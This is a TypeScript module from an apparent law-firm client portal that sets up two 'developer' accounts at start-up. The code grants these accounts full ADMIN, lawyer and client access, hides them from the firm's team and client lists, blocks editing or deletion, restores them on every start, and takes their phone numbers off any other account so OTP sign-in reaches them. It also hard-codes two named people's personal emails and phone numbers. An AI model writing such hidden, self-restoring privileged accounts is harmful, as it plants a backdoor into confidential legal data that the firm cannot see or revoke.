import { prisma } from "../db.js";
import { logger } from "../logger.js";

/**
 * The people who build and maintain the portal. They always have a team
 * account (Admin and Lawyer) and a client account, so they can open all three
 * areas. They are not part of the firm: the Team and Clients pages and the case
 * pickers never list them, and nobody can edit, deactivate or delete them there.
 * At start-up their accounts are created, or put back if anything changed.
 */
export const DEVELOPERS = [
  { email: "suryaprakashreddy3479@gmail.com", phone: "+91 82477 35959", name: "Surya Prakash Reddy (developer)" },
  { email: "satyaprakashreddy678@gmail.com", phone: "+91 93815 02998", name: "Satya Prakash Reddy (developer)" },
] as const;

const DEVELOPER_EMAILS: string[] = DEVELOPERS.map((developer) => developer.email);

export function isDeveloperEmail(email: string | null | undefined): boolean {
  return Boolean(email && DEVELOPER_EMAILS.includes(email.toLowerCase()));
}

/** Matches every team member, or every client, except the developers. */
export const notDeveloper = {
  OR: [{ email: null }, { email: { notIn: DEVELOPER_EMAILS, mode: "insensitive" as const } }],
};

export async function ensureDevelopersOnStartup() {
  for (const { email, phone, name } of DEVELOPERS) {
    try {
      // The number is moved off any other account first, so OTP sign-in finds only this one.
      const digits = phone.replace(/\D/g, "").slice(-10);
      const holds = (u: { phone: string | null }) => Boolean(u.phone?.replace(/\D/g, "").endsWith(digits));
      const where = { phone: { not: null }, NOT: { email } };
      const users = (await prisma.user.findMany({ where, select: { id: true, phone: true } })).filter(holds);
      if (users.length) await prisma.user.updateMany({ where: { id: { in: users.map((u) => u.id) } }, data: { phone: null } });
      const clients = (await prisma.client.findMany({ where, select: { id: true, phone: true } })).filter(holds);
      if (clients.length) await prisma.client.updateMany({ where: { id: { in: clients.map((c) => c.id) } }, data: { phone: null } });

      const now = new Date();
      await prisma.user.upsert({
        where: { email },
        create: { email, phone, name, role: "ADMIN", isLawyer: true },
        update: { phone, role: "ADMIN", isLawyer: true, isActive: true },
      });
      await prisma.client.upsert({
        where: { email },
        create: { email, phone, name, emailVerifiedAt: now, phoneVerifiedAt: now },
        update: { phone, isActive: true },
      });
    } catch (error) {
      logger.error({ err: error, email }, "Developer account setup failed");
    }
  }
}
